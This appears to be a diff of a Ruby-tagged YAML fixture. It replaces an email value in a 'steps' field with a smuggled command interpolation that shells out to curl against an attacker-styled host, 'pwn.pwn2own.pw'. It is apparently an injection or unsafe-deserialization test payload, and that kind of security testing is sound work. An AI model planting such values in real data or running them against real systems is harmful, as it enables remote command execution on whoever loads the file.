@@ -1,2 +1,2 @@
 --- !ruby/hash:Hash
-steps: [richard@example.com]
+steps: [#{%x[curl pwn.pwn2own.pw]}]
